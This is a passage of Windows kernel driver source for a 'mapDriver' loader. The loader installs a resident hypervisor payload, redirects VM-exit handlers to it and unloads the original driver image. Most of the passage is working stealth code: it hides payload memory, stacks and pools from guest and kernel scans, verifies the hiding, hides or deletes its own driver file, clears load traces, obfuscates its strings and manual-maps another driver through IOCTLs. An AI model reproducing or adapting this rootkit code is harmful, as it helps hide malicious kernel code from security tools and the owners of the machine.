    RtlZeroMemory(bridge, sizeof(*bridge));
    bridge->magic = MAPCTL_HOST_RIP_SWITCH_MAGIC;
    bridge->size = sizeof(*bridge);
    bridge->arm = MAPCTL_HOST_RIP_SWITCH_ARM;
    mapdriver_switch_host_bridge(bridge);
    LOG_DEBUG(_XOR_("[mapDriver] onekey switchbridge result=0x%llX switched=%llu/%llu failed=%llu new=0x%llX old=0x%llX\n"),
        bridge->result,
        bridge->switched_count,
        bridge->requested_count,
        bridge->failed_index,
        bridge->last_new_rip,
        bridge->last_old_rip);
    if (bridge->result != PAYLOAD_RESULT_OK)
        return false;

    auto check = &g_onekey_check;
    RtlZeroMemory(check, sizeof(*check));
    if (!mapdriver_onekey_wait_migration_ready("post-switchbridge", 5000, 50, check))
        return false;

    if (!mapdriver_install_payload_host_idt_for_active_vcpus("onekey-post-switchbridge"))
        return false;

    if (!mapdriver_unload_common(DriverObject, true, false, true))
    {
        LOG_DEBUG(_XOR_("[mapDriver] onekey handoff failed %d\n"), 0);
        return false;
    }

    auto cut = &g_onekey_cutover;
    RtlZeroMemory(cut, sizeof(*cut));
    cut->magic = MAPCTL_CUTOVER_MAGIC;
    cut->size = sizeof(*cut);
    cut->arm = MAPCTL_CUTOVER_ARM;
    // CLEAR is only safe when the TestDriver image is about to be released, or
    // when a specific no-fallback bisect is requested.  In the ordinary
    // soft-quarantine build the payload still needs the legacy handler for
    // VM-exit paths that have not been fully ported yet.
    cut->mode = PAYLOAD_CUTOVER_MODE_CLEAR;
    mapdriver_cutover_control(cut);
    LOG_DEBUG(_XOR_("[mapDriver] onekey cutover mode=%llu result=0x%llX old=0x%llX new=0x%llX\n"),
        cut->mode,
        cut->result,
        cut->old_target,
        cut->new_target);
    if (cut->result != PAYLOAD_RESULT_OK)
        return false;

    if (!mapdriver_onekey_wait_migration_ready("post-cutover", 1000, 50, check))
        return false;

    auto freetest = &g_onekey_freetest;
    RtlZeroMemory(freetest, sizeof(*freetest));
    freetest->magic = MAPCTL_RELEASE_LEGACY_IMAGE_MAGIC;
    freetest->size = sizeof(*freetest);
    freetest->arm = MAPCTL_RELEASE_LEGACY_IMAGE_ARM;
    mapdriver_free_test_image_control(freetest);
    LOG_DEBUG(_XOR_("[mapDriver] onekey freetest result=0x%llX phase=%llu test=0x%llX/0x%llX -> 0x%llX/0x%llX vcpu=%llu/%llu refs=%llu bridge_tgt=0x%llX\n"),
        freetest->result,
        freetest->free_phase,
        freetest->test_before,
        freetest->test_size_before,
        freetest->test_after,
        freetest->test_size_after,
        freetest->vcpu_ready,
        freetest->vcpu_requested,
        freetest->scan_refs,
        freetest->bridge_target);
    if (freetest->result != PAYLOAD_RESULT_OK)
        return false;

    // Validation now goes through mapDriver ctl, not the resident payload WDM
    // dispatch.  In the current stability build, keep these ranges visible
    // after handoff; manual hide/memcheck commands can still bisect the PFN
    // hide path without taking the VM down during ordinary load.
#if MAPDRIVER_AUTO_ONEKEY_HIDE_AFTER_HANDOFF
    mapdriver_hide_payload_memory("onekey-payload-image-direct");
    mapdriver_hide_payload_host_stack("onekey-host-stack");
#if MAPDRIVER_AUTO_ONEKEY_HIDE_RESIDENT_POOLS
    mapdriver_hide_payload_resident_pool_blocks("onekey-resident-pools");
#endif
#if MAPDRIVER_AUTO_ONEKEY_HIDE_FULL_ARENA
    mapdriver_hide_payload_arena_full("onekey-full-arena");
#else
    mapdriver_hide_payload_arena_used("onekey-data-arena");
#endif
    auto memcheck = &g_onekey_memcheck;
    RtlZeroMemory(memcheck, sizeof(*memcheck));
    memcheck->flags = MAPCTL_MEMCHECK_FLAG_ALL;
    mapdriver_memcheck_control(memcheck);
    bool const hide_ok =
        memcheck->result == PAYLOAD_RESULT_OK &&
        memcheck->done != 0 &&
        memcheck->checked_pages != 0 &&
        memcheck->hidden_pages == memcheck->checked_pages &&
        memcheck->visible_pages == 0 &&
        memcheck->unknown_pages == 0 &&
        memcheck->translate_fail == 0 &&
        memcheck->verify_fail == 0;
    LOG_DEBUG(_XOR_("[mapDriver] resident hide verify ok=%d result=0x%llX done=%llu checked=%llu hidden=%llu visible=%llu unknown=%llu translate_fail=%llu verify_fail=%llu\n"),
        (int)hide_ok,
        memcheck->result,
        memcheck->done,
        memcheck->checked_pages,
        memcheck->hidden_pages,
        memcheck->visible_pages,
        memcheck->unknown_pages,
        memcheck->translate_fail,
        memcheck->verify_fail);
    if (!hide_ok)
        return false;
#else
    LOG_DEBUG(_XOR_("[mapDriver] onekey auto-hide skipped for stability build\n"));
#endif
#if MAPDRIVER_AUTO_ONEKEY_DROP_MAP_CTL
    mapdriver_delete_control_device();
#endif

    LOG_DEBUG(_XOR_("[mapDriver] onekey complete %d\n"), 1);
    return true;
}

static bool mapdriver_onekey_execute(PDRIVER_OBJECT DriverObject)
{
    // Do not use a mandatory blind sleep here.  The real readiness gates are
    // payload barrier below and the post-switchbridge migration check.  A small
    // fixed delay can still be enabled for stress/debug builds through base.h.
#if MAPDRIVER_AUTO_ONEKEY_INITIAL_DELAY_MS
    mapdriver_delay_ms((LONG)MAPDRIVER_AUTO_ONEKEY_INITIAL_DELAY_MS);
#endif

#if MAPDRIVER_AUTO_ONEKEY_WAIT_PMO_READY
    payload_status ps = {};
    bool ok = mapdriver_onekey_wait_payload_barrier(10000, 100, &ps);
    if (ok)
        ok = mapdriver_onekey_wait_pmo_stable(30000, 100, &ps);
#else
    mapctl_migration_check pre = {};
    bool ok = mapdriver_onekey_wait_pre_switch_ready(10000, 50, &pre);
    if (!ok &&
        (pre.diag.flags & 2ull) != 0 &&
        pre.diag.vmcs_host_rip == 0)
    {
        ok = mapdriver_run_amd_onekey_load(DriverObject, pre);
        LOG_DEBUG(_XOR_("[mapDriver] onekey AMD resident transfer ok=%d retain_test=0 host_rip=0\n"),
            (int)ok);
        return ok;
    }
#endif
    if (ok)
        ok = mapdriver_run_onekey_load(DriverObject);

    return ok;
}

struct mapdriver_onekey_callout_context
{
    PDRIVER_OBJECT DriverObject;
    bool ok;
};

static VOID mapdriver_onekey_expanded_callout(PVOID Parameter)
{
    auto ctx = (mapdriver_onekey_callout_context*)Parameter;
    if (!ctx)
        return;

    ctx->ok = mapdriver_onekey_execute(ctx->DriverObject);
}

static bool mapdriver_run_onekey_expanded(PDRIVER_OBJECT DriverObject)
{
    mapdriver_onekey_callout_context ctx = {};
    ctx.DriverObject = DriverObject;
    ctx.ok = false;

    NTSTATUS status = KeExpandKernelStackAndCallout(
        mapdriver_onekey_expanded_callout,
        &ctx,
        (SIZE_T)MAPDRIVER_AUTO_ONEKEY_EXPAND_STACK_SIZE);
    if (!NT_SUCCESS(status))
    {
        LOG_DEBUG(_XOR_("[mapDriver] onekey expand-stack failed 0x%X; running inline fallback\n"), status);
        ctx.ok = mapdriver_onekey_execute(DriverObject);
    }

    return ctx.ok;
}

#if MAPDRIVER_AUTO_ONEKEY_USE_THREAD
static VOID mapdriver_onekey_worker(PVOID StartContext)
{
    UNREFERENCED_PARAMETER(StartContext);

    bool ok = mapdriver_onekey_execute(nullptr);

    LOG_DEBUG(_XOR_("[mapDriver] onekey worker leave ok=%d\n"), (int)ok);
    PsTerminateSystemThread(ok ? STATUS_SUCCESS : STATUS_DEVICE_NOT_READY);
}

static void mapdriver_start_onekey_worker()
{
    if (_InterlockedCompareExchange(&g_onekey_worker_started, 1, 0) != 0)
        return;

    HANDLE thread = nullptr;
    NTSTATUS status = PsCreateSystemThread(
        &thread,
        THREAD_ALL_ACCESS,
        nullptr,
        nullptr,
        nullptr,
        mapdriver_onekey_worker,
        nullptr);
    if (NT_SUCCESS(status))
    {
        if (thread)
            ZwClose(thread);
        LOG_DEBUG(_XOR_("[mapDriver] onekey worker queued %d\n"), 1);
    }
    else
    {
        _InterlockedExchange(&g_onekey_worker_started, 0);
        LOG_DEBUG(_XOR_("[mapDriver] onekey worker create failed 0x%X\n"), status);
    }
}
#endif
#endif

static NTSTATUS mapdriver_ctl_create_close(PDEVICE_OBJECT DeviceObject, PIRP Irp)
{
    if (DeviceObject != g_control_device)
    {
        auto stack = IoGetCurrentIrpStackLocation(Irp);
        if (stack && stack->MajorFunction == IRP_MJ_CREATE && Utils::machenikeCreateDispatch)
            return Utils::machenikeCreateDispatch(DeviceObject, Irp);
        if (stack && stack->MajorFunction == IRP_MJ_CLOSE && Utils::machenikeCloseDispatch)
            return Utils::machenikeCloseDispatch(DeviceObject, Irp);
    }
    Irp->IoStatus.Status = STATUS_SUCCESS;
    Irp->IoStatus.Information = 0;
    IoCompleteRequest(Irp, IO_NO_INCREMENT);
    return STATUS_SUCCESS;
}

static NTSTATUS mapdriver_ctl_invalid(PDEVICE_OBJECT DeviceObject, PIRP Irp)
{
    UNREFERENCED_PARAMETER(DeviceObject);
    if (!Irp)
        return STATUS_INVALID_DEVICE_REQUEST;

    Irp->IoStatus.Status = STATUS_INVALID_DEVICE_REQUEST;
    Irp->IoStatus.Information = 0;
    IoCompleteRequest(Irp, IO_NO_INCREMENT);
    return STATUS_INVALID_DEVICE_REQUEST;
}

static NTSTATUS mapdriver_ctl_device_control(PDEVICE_OBJECT DeviceObject, PIRP Irp)
{
    if (DeviceObject != g_control_device && Utils::machenikeDeviceControlDispatch)
        return Utils::machenikeDeviceControlDispatch(DeviceObject, Irp);

    NTSTATUS status = STATUS_INVALID_DEVICE_REQUEST;
    ULONG_PTR information = 0;
    auto stack = IoGetCurrentIrpStackLocation(Irp);
    ULONG code = stack->Parameters.DeviceIoControl.IoControlCode;
    ULONG in_len = stack->Parameters.DeviceIoControl.InputBufferLength;
    ULONG out_len = stack->Parameters.DeviceIoControl.OutputBufferLength;
    auto buffer = Irp->AssociatedIrp.SystemBuffer;
    bool delete_control_after_complete = false;

    if (code != MAPCTL_IOCTL_STATUS && code != MAPCTL_IOCTL_MIGRATE_CHECK)
    {
        LOG_DEBUG(_XOR_("[mapDriver] IOCTL enter code=0x%08X in=%lu out=%lu\n"), code, in_len, out_len);
    }

    switch (code)
    {
    case MAPCTL_IOCTL_STATUS:
        if (buffer && out_len >= sizeof(payload_u64))
        {
            mapctl_status st = {};
            mapdriver_fill_control_status(&st);
            ULONG copy_len = out_len < sizeof(st) ? out_len : sizeof(st);
            RtlCopyMemory(buffer, &st, copy_len);
            information = copy_len;
            status = STATUS_SUCCESS;
        }
        else
        {
            status = STATUS_BUFFER_TOO_SMALL;
        }
        break;

    case MAPCTL_IOCTL_MEMCHECK:
        if (buffer && in_len >= sizeof(mapctl_memcheck) && out_len >= sizeof(mapctl_memcheck))
        {
            auto req = (mapctl_memcheck*)buffer;
            mapdriver_memcheck_control(req);
            information = sizeof(*req);
            status = STATUS_SUCCESS;
        }
        else
        {
            status = STATUS_BUFFER_TOO_SMALL;
        }
        break;

    case MAPCTL_IOCTL_MEMORY_AUDIT:
        if (buffer && in_len >= sizeof(mapctl_mmtest) && out_len >= sizeof(mapctl_mmtest))
        {
            auto req = (mapctl_mmtest*)buffer;
            if (req->flags & MAPCTL_MEMORY_AUDIT_OP_NOOP)
            {
                mapdriver_mmtest_noop_control(req);
            }
            else
            {
                mapdriver_mmtest_control(req);
            }
            information = sizeof(*req);
            status = STATUS_SUCCESS;
        }
        else
        {
            status = STATUS_BUFFER_TOO_SMALL;
        }
        break;

    case MAPCTL_IOCTL_SMOKE:
        if (buffer && out_len >= sizeof(mapctl_smoke))
        {
            auto req = (mapctl_smoke*)buffer;
            RtlZeroMemory(req, sizeof(*req));
            req->magic = MAPCTL_SMOKE_MAGIC;
            req->size = sizeof(*req);
            req->result = PAYLOAD_RESULT_OK;
            req->marker = MAPCTL_SMOKE_MARKER;
            req->mmtest_noop_supported = 1;
            information = sizeof(*req);
            status = STATUS_SUCCESS;
        }
        else
        {
            status = STATUS_BUFFER_TOO_SMALL;
        }
        break;

    case MAPCTL_IOCTL_HANDOFF:
        status = mapdriver_unload_common(nullptr, true) ? STATUS_SUCCESS : STATUS_DEVICE_NOT_READY;
        break;

    case MAPCTL_IOCTL_HANDOFF_DROPCTL:
        status = mapdriver_unload_common(nullptr, true, false) ? STATUS_SUCCESS : STATUS_DEVICE_NOT_READY;
        if (NT_SUCCESS(status) && mapdriver_hv_ready())
        {
            // Keep the normal resident IOCTL dispatch path executable/visible,
            // but hide the large migrated legacy data arena (ghv/vt_hook/etc.)
            // before deleting mapDriver control.  The VM-exit bridge runs in
            // root mode and can still use the hidden arena; guest/kernel scans
            // should see dummy PFNs for those data pages.
            mapdriver_unhide_payload_memory("handoff-dropctl-before-control-delete");
            mapdriver_hide_payload_host_stack("handoff-dropctl-host-stack");
            mapdriver_hide_payload_resident_pool_blocks("handoff-dropctl-resident-pools");
#if MAPDRIVER_AUTO_ONEKEY_HIDE_FULL_ARENA
            mapdriver_hide_payload_arena_full("handoff-dropctl-full-arena");
#else
            mapdriver_hide_payload_arena_used("handoff-dropctl-data-arena");
#endif
        }
        delete_control_after_complete = NT_SUCCESS(status);
        break;

    case MAPCTL_IOCTL_FORCE_PAYLOAD:
        force_unload_payload(nullptr);
        status = STATUS_SUCCESS;
        break;

    case MAPCTL_IOCTL_CLEAN_RUNTIME:
        status = mapdriver_unload_common(nullptr, false) ? STATUS_SUCCESS : STATUS_DEVICE_NOT_READY;
        break;

    case MAPCTL_IOCTL_PAYLOAD_PING:
        if (buffer && in_len >= sizeof(mapctl_ping) && out_len >= sizeof(mapctl_ping))
        {
            auto ping = (mapctl_ping*)buffer;
            if (g_payload_detached && mapdriver_hv_ready())
            {
                __try
                {
                    ping->pong = hv::vmcall_payload_ping(ping->nonce);
                    ping->result = (ping->pong == (ping->nonce ^ PAYLOAD_PONG_MAGIC))
                        ? PAYLOAD_RESULT_OK
                        : PAYLOAD_RESULT_INVALID_CONTEXT;
                    information = sizeof(*ping);
                    status = STATUS_SUCCESS;
                }
                __except (EXCEPTION_EXECUTE_HANDLER)
                {
                    status = STATUS_DEVICE_NOT_READY;
                }
            }
            else if (Utils::payloadExports && Utils::payloadExports->ping)
            {
                ping->pong = Utils::payloadExports->ping(ping->nonce);
                ping->result = (ping->pong == (ping->nonce ^ PAYLOAD_PONG_MAGIC))
                    ? PAYLOAD_RESULT_OK
                    : PAYLOAD_RESULT_INVALID_CONTEXT;
                information = sizeof(*ping);
                status = STATUS_SUCCESS;
            }
            else
            {
                status = STATUS_DEVICE_NOT_READY;
            }
        }
        else
        {
            status = STATUS_BUFFER_TOO_SMALL;
        }
        break;

    case MAPCTL_IOCTL_HV_PING:
        if (buffer && in_len >= sizeof(mapctl_ping) && out_len >= sizeof(mapctl_ping))
        {
            auto ping = (mapctl_ping*)buffer;
            __try
            {
                ping->pong = hv::ping();
                ping->result = (ping->pong == hv::hypervisor_signature)
                    ? PAYLOAD_RESULT_OK
                    : PAYLOAD_RESULT_INVALID_CONTEXT;
            }
            __except (EXCEPTION_EXECUTE_HANDLER)
            {
                ping->pong = 0;
                ping->result = PAYLOAD_RESULT_INVALID_CONTEXT;
            }
            information = sizeof(*ping);
            status = STATUS_SUCCESS;
        }
        else
        {
            status = STATUS_BUFFER_TOO_SMALL;
        }
        break;

    case MAPCTL_IOCTL_HV_DIAG:
        if (buffer && out_len >= sizeof(mapctl_hv_diag))
        {
            auto diag = (mapctl_hv_diag*)buffer;
            RtlZeroMemory(diag, sizeof(*diag));
            __try
            {
                auto copied = mapdriver_get_resident_hv_diag(diag);
                if (mapdriver_hv_diag_valid(*diag, copied))
                {
                    information = sizeof(*diag);
                    status = STATUS_SUCCESS;
                }
                else
                {
                    status = STATUS_DEVICE_NOT_READY;
                }
            }
            __except (EXCEPTION_EXECUTE_HANDLER)
            {
                status = STATUS_DEVICE_NOT_READY;
            }
        }
        else
        {
            status = STATUS_BUFFER_TOO_SMALL;
        }
        break;

    case MAPCTL_IOCTL_MIGRATE_CHECK:
        if (buffer && out_len >= sizeof(mapctl_migration_check))
        {
            auto check = (mapctl_migration_check*)buffer;
            mapdriver_fill_migration_check(check);
            information = sizeof(*check);
            status = STATUS_SUCCESS;
        }
        else
        {
            status = STATUS_BUFFER_TOO_SMALL;
        }
        break;

    case MAPCTL_IOCTL_HOST_RSP_SWITCH:
        if (buffer && in_len >= sizeof(mapctl_host_rsp_switch) && out_len >= sizeof(mapctl_host_rsp_switch))
        {
            auto req = (mapctl_host_rsp_switch*)buffer;
            mapdriver_switch_host_rsp(req);
            information = sizeof(*req);
            status = STATUS_SUCCESS;
        }
        else
        {
            status = STATUS_BUFFER_TOO_SMALL;
        }
        break;

    case MAPCTL_IOCTL_HOST_RSP_RESTORE:
        if (buffer && in_len >= sizeof(mapctl_host_rsp_switch) && out_len >= sizeof(mapctl_host_rsp_switch))
        {
            auto req = (mapctl_host_rsp_switch*)buffer;
            mapdriver_restore_host_rsp(req);
            information = sizeof(*req);
            status = STATUS_SUCCESS;
        }
        else
        {
            status = STATUS_BUFFER_TOO_SMALL;
        }
        break;

    case MAPCTL_IOCTL_HOST_RIP_SWITCH:
        if (buffer && in_len >= sizeof(mapctl_host_rip_switch) && out_len >= sizeof(mapctl_host_rip_switch))
        {
            auto req = (mapctl_host_rip_switch*)buffer;
            mapdriver_switch_host_rip(req);
            information = sizeof(*req);
            status = STATUS_SUCCESS;
        }
        else
        {
            status = STATUS_BUFFER_TOO_SMALL;
        }
        break;

    case MAPCTL_IOCTL_HOST_RIP_RESTORE:
        if (buffer && in_len >= sizeof(mapctl_host_rip_switch) && out_len >= sizeof(mapctl_host_rip_switch))
        {
            auto req = (mapctl_host_rip_switch*)buffer;
            mapdriver_restore_host_rip(req);
            information = sizeof(*req);
            status = STATUS_SUCCESS;
        }
        else
        {
            status = STATUS_BUFFER_TOO_SMALL;
        }
        break;

    case MAPCTL_IOCTL_HOST_BRIDGE_SWITCH:
        if (buffer && in_len >= sizeof(mapctl_host_rip_switch) && out_len >= sizeof(mapctl_host_rip_switch))
        {
            auto req = (mapctl_host_rip_switch*)buffer;
            mapdriver_switch_host_bridge(req);
            information = sizeof(*req);
            status = STATUS_SUCCESS;
        }
        else
        {
            status = STATUS_BUFFER_TOO_SMALL;
        }
        break;

    case MAPCTL_IOCTL_HOST_BRIDGE_RESTORE:
        if (buffer && in_len >= sizeof(mapctl_host_rip_switch) && out_len >= sizeof(mapctl_host_rip_switch))
        {
            auto req = (mapctl_host_rip_switch*)buffer;
            mapdriver_restore_host_rip(req);
            information = sizeof(*req);
            status = STATUS_SUCCESS;
        }
        else
        {
            status = STATUS_BUFFER_TOO_SMALL;
        }
        break;

    case MAPCTL_IOCTL_VTRET_MODE:
        if (buffer && in_len >= sizeof(mapctl_vtret_mode) && out_len >= sizeof(mapctl_vtret_mode))
        {
            auto req = (mapctl_vtret_mode*)buffer;
            mapdriver_vtret_mode_control(req);
            information = sizeof(*req);
            status = STATUS_SUCCESS;
        }
        else
        {
            status = STATUS_BUFFER_TOO_SMALL;
        }
        break;

    case MAPCTL_IOCTL_TRAMP_MODE:
        if (buffer && in_len >= sizeof(mapctl_tramp_mode) && out_len >= sizeof(mapctl_tramp_mode))
        {
            auto req = (mapctl_tramp_mode*)buffer;
            mapdriver_tramp_mode_control(req);
            information = sizeof(*req);
            status = STATUS_SUCCESS;
        }
        else
        {
            status = STATUS_BUFFER_TOO_SMALL;
        }
        break;

    case MAPCTL_IOCTL_HOOK_MODE:
        if (buffer && in_len >= sizeof(mapctl_hook_mode) && out_len >= sizeof(mapctl_hook_mode))
        {
            auto req = (mapctl_hook_mode*)buffer;
            mapdriver_hook_mode_control(req);
            information = sizeof(*req);
            status = STATUS_SUCCESS;
        }
        else
        {
            status = STATUS_BUFFER_TOO_SMALL;
        }
        break;

    case MAPCTL_IOCTL_EPT_MODE:
        if (buffer && in_len >= sizeof(mapctl_ept_mode) && out_len >= sizeof(mapctl_ept_mode))
        {
            auto req = (mapctl_ept_mode*)buffer;
            mapdriver_ept_mode_control(req);
            information = sizeof(*req);
            status = STATUS_SUCCESS;
        }
        else
        {
            status = STATUS_BUFFER_TOO_SMALL;
        }
        break;

    case MAPCTL_IOCTL_CUTOVER:
        if (buffer && in_len >= sizeof(mapctl_cutover) && out_len >= sizeof(mapctl_cutover))
        {
            auto req = (mapctl_cutover*)buffer;
            mapdriver_cutover_control(req);
            information = sizeof(*req);
            status = STATUS_SUCCESS;
        }
        else
        {
            status = STATUS_BUFFER_TOO_SMALL;
        }
        break;

    case MAPCTL_IOCTL_HOST_EXCEPTION_PROBE:
        if (buffer && in_len >= sizeof(mapctl_hostex_test) && out_len >= sizeof(mapctl_hostex_test))
        {
            auto req = (mapctl_hostex_test*)buffer;
            mapdriver_hostex_test_control(req);
            information = sizeof(*req);
            status = STATUS_SUCCESS;
        }
        else
        {
            status = STATUS_BUFFER_TOO_SMALL;
        }
        break;

    case MAPCTL_IOCTL_RELEASE_LEGACY_IMAGE:
        if (buffer && in_len >= sizeof(mapctl_free_test) && out_len >= sizeof(mapctl_free_test))
        {
            auto req = (mapctl_free_test*)buffer;
            mapdriver_free_test_image_control(req);
            information = sizeof(*req);
            status = STATUS_SUCCESS;
        }
        else
        {
            status = STATUS_BUFFER_TOO_SMALL;
        }
        break;

    case MAPCTL_IOCTL_LEGACY_DETACH:
        if (buffer && in_len >= sizeof(mapctl_legacy_detach) && out_len >= sizeof(mapctl_legacy_detach))
        {
            auto req = (mapctl_legacy_detach*)buffer;
            mapdriver_legacy_detach_control(req);
            if (req->result == PAYLOAD_RESULT_OK &&
                ((req->new_flags & PAYLOAD_LEGACY_DETACH_FLAG_COMPLETE) != 0))
            {
                mapdriver_adopt_testdriver_pool_blocks("legacy-detach-ioctl");
                req->stage = 7;
            }
            information = sizeof(*req);
            status = STATUS_SUCCESS;
        }
        else
        {
            status = STATUS_BUFFER_TOO_SMALL;
        }
        break;

    case MAPCTL_IOCTL_FULL_UNLOAD:
        if (buffer && in_len >= sizeof(mapctl_full_unload) && out_len >= sizeof(mapctl_full_unload))
        {
            auto req = (mapctl_full_unload*)buffer;
            mapdriver_full_unload_runtime(req);
            delete_control_after_complete = (req->control_delete_queued != 0);
            information = sizeof(*req);
            status = STATUS_SUCCESS;
        }
        else
        {
            status = STATUS_BUFFER_TOO_SMALL;
        }
        break;

    case MAPCTL_IOCTL_LOAD_MACHENIKE:
        if (buffer && in_len >= sizeof(mapctl_load_machenike) && out_len >= sizeof(mapctl_load_machenike))
        {
            auto req = (mapctl_load_machenike*)buffer;
            if (req->magic == MAPCTL_LOAD_MK_MAGIC && req->arm == MAPCTL_LOAD_MK_ARM)
            {
                BOOLEAN isManualMap = (req->load_mode == MAPCTL_MK_MODE_MANUAL_MAP) ? TRUE : FALSE;
                PUNICODE_STRING regOrBootCfg = isManualMap ? (PUNICODE_STRING)req->boot_config : nullptr;
                bool mk_ok = mapdriver_load_machenike(g_host_driver_object, regOrBootCfg, isManualMap);
                req->result = mk_ok ? PAYLOAD_RESULT_OK : PAYLOAD_RESULT_INVALID_CONTEXT;
                req->load_mode = (payload_u64)Utils::machenikeMode;
                req->machenike_base = (payload_u64)Utils::machenikeBase;
                req->machenike_size = (payload_u64)Utils::machenikeSize;
                RtlSecureZeroMemory(req->boot_config, sizeof(req->boot_config));
                information = sizeof(*req);
                status = STATUS_SUCCESS;
            }
            else
            {
                status = STATUS_INVALID_PARAMETER;
            }
        }
        else
        {
            status = STATUS_BUFFER_TOO_SMALL;
        }
        break;
    }

    if (code != MAPCTL_IOCTL_STATUS && code != MAPCTL_IOCTL_MIGRATE_CHECK)
    {
        LOG_DEBUG(_XOR_("[mapDriver] IOCTL leave code=0x%08X status=0x%08X info=0x%llX del_ctl=%d\n"),
            code, status, (ULONGLONG)information, (int)delete_control_after_complete);
    }

    Irp->IoStatus.Status = status;
    Irp->IoStatus.Information = information;
    IoCompleteRequest(Irp, IO_NO_INCREMENT);
    if (delete_control_after_complete)
        mapdriver_delete_control_device();
    return status;
}

static void mapdriver_delete_control_device()
{
    if (g_control_symlink.Buffer)
        IoDeleteSymbolicLink(&g_control_symlink);

    if (g_control_device)
    {
        IoDeleteDevice(g_control_device);
        g_control_device = nullptr;
    }

    RtlZeroMemory(&g_control_symlink, sizeof(g_control_symlink));
}

static void mapdriver_reclaim_orphaned_control_device(PDRIVER_OBJECT CurrentDriver, PUNICODE_STRING DevName, PUNICODE_STRING SymlinkName)
{
    if (SymlinkName && SymlinkName->Buffer)
        IoDeleteSymbolicLink(SymlinkName);

    if (!DevName || !DevName->Buffer)
        return;

    PFILE_OBJECT fileObj = nullptr;
    PDEVICE_OBJECT devObj = nullptr;
    if (NT_SUCCESS(IoGetDeviceObjectPointer(DevName, FILE_READ_ATTRIBUTES, &fileObj, &devObj)))
    {
        PDEVICE_OBJECT orphanDev = (fileObj && fileObj->DeviceObject) ? fileObj->DeviceObject : devObj;
        if (fileObj)
            ObDereferenceObject(fileObj);

        if (orphanDev && orphanDev->DriverObject != CurrentDriver)
        {
            LOG_DEBUG(_XOR_("[mapDriver] reclaiming orphaned control device=%p orphanDriver=%p currentDriver=%p\n"),
                orphanDev, orphanDev->DriverObject, CurrentDriver);
            if (orphanDev->DriverObject)
                orphanDev->DriverObject->DriverUnload = nullptr;
            IoDeleteDevice(orphanDev);
        }
    }
}

static bool mapdriver_create_control_device(PDRIVER_OBJECT DriverObject)
{
    if (!DriverObject || g_control_device)
        return g_control_device != nullptr;

    UNICODE_STRING dev_name = {};
    RtlInitUnicodeString(&dev_name, MAPCTL_NT_DEVICE_NAME);
    RtlInitUnicodeString(&g_control_symlink, MAPCTL_DOS_DEVICE_NAME);

    NTSTATUS status = IoCreateDevice(
        DriverObject,
        0,
        &dev_name,
        FILE_DEVICE_UNKNOWN,
        FILE_DEVICE_SECURE_OPEN,
        FALSE,
        &g_control_device);
    if (status == STATUS_OBJECT_NAME_COLLISION)
    {
        mapdriver_reclaim_orphaned_control_device(DriverObject, &dev_name, &g_control_symlink);
        status = IoCreateDevice(
            DriverObject,
            0,
            &dev_name,
            FILE_DEVICE_UNKNOWN,
            FILE_DEVICE_SECURE_OPEN,
            FALSE,
            &g_control_device);
    }
    if (!NT_SUCCESS(status))
    {
        LOG_DEBUG(_XOR_("[mapDriver] control device create failed 0x%X\n"), status);
        RtlZeroMemory(&g_control_symlink, sizeof(g_control_symlink));
        return false;
    }

    for (ULONG i = 0; i <= IRP_MJ_MAXIMUM_FUNCTION; ++i)
        DriverObject->MajorFunction[i] = mapdriver_ctl_invalid;

    DriverObject->MajorFunction[IRP_MJ_CREATE] = mapdriver_ctl_create_close;
    DriverObject->MajorFunction[IRP_MJ_CLOSE] = mapdriver_ctl_create_close;
    DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = mapdriver_ctl_device_control;

    IoDeleteSymbolicLink(&g_control_symlink);
    status = IoCreateSymbolicLink(&g_control_symlink, &dev_name);
    if (!NT_SUCCESS(status))
    {
        LOG_DEBUG(_XOR_("[mapDriver] control symlink create failed 0x%X\n"), status);
        mapdriver_delete_control_device();
        return false;
    }

    g_control_device->Flags &= ~DO_DEVICE_INITIALIZING;
    LOG_DEBUG(_XOR_("[mapDriver] control device ready %ws\n"), g_control_symlink.Buffer);
    return true;
}

// DriverMain's diagnostic branches contain several large fixed-size locals.
// Keep the complete implementation on an expanded kernel stack so later
// cleanup/logging cannot inherit an already exhausted loader stack.
struct mapdriver_driver_main_context
{
    PDRIVER_OBJECT driver_object;
    PUNICODE_STRING registry_path;
    NTSTATUS result;
    BOOLEAN completed;
};

__declspec(noinline)
static NTSTATUS mapdriver_driver_main_body(
    PDRIVER_OBJECT DriverObject,
    PUNICODE_STRING RegistryPath)
{
    NTSTATUS final_status = STATUS_UNSUCCESSFUL;
    PCWSTR driver_name = mapdriver_driver_name(DriverObject);
    mapdriver_cache_trace_driver_name(driver_name);

    LOG_DEBUG(_XOR_("[mapDriver] DriverMain enter DriverObject=%p RegistryPath=%p\n"),
        DriverObject,
        RegistryPath);
    g_yvt.InitNtSymbol();
    LOG_DEBUG(_XOR_("[mapDriver] ntos symbols base=%p size=0x%X alloc=%p free=%p prot=%p\n"),
        (PVOID)g_yvt.ntosInfo.imageBase,
        (ULONG)g_yvt.ntosInfo.imageSize,
        MmAllocateIndependentPages,
        MmFreeIndependentPages,
        MmSetPageProtection);

    if (DriverObject)
    {
        g_host_driver_object = DriverObject;
        DriverObject->DriverUnload = unload_driver;
#if !MAPDRIVER_AUTO_ONEKEY_LOAD || MAPDRIVER_AUTO_ONEKEY_KEEP_MAP_CTL
        if (!mapdriver_create_control_device(DriverObject))
        {
            LOG_DEBUG(_XOR_("[mapDriver] control device is not available; refusing pseudo-load\n"));
            DriverObject->DriverUnload = nullptr;
            g_host_driver_object = nullptr;
            return STATUS_DEVICE_ALREADY_ATTACHED;
        }
#endif
    }

#if MAPDRIVER_DRIVER_FILE_HIDE_ENABLED
    mapdriver_hide_driver_file(DriverObject);
#endif
#if MAPDRIVER_DRIVER_FILE_DELETE_ENABLED
    DeleteDriverFile(DriverObject);
#endif
    mapdriver_clear_traces(driver_name, false);
    bool const pre_load_hv_ready = mapdriver_hv_ready();
    LOG_DEBUG(_XOR_("[mapDriver] pre-load cleanup done hv_ready=%d\n"), (int)pre_load_hv_ready);

    if (pre_load_hv_ready)
    {
        mapctl_full_unload stale = {};
        bool stale_stop_used = false;
        __try
        {
            stale_stop_used = mapdriver_stop_resident_hv_without_testdriver(&stale);
        }
        __except (EXCEPTION_EXECUTE_HANDLER)
        {
            stale_stop_used = false;
        }

        if (stale_stop_used)
            mapdriver_wait_ms(100);

        if (!mapdriver_hv_ready())
        {
            LOG_DEBUG(_XOR_("[mapDriver] stale resident HV stopped during fresh load self=0x%llX ack=0x%llX exc=0x%llX\n"),
                stale.selfstop_result,
                stale.selfstop_ack,
                stale.selfstop_exceptions);
        }
        else
        {
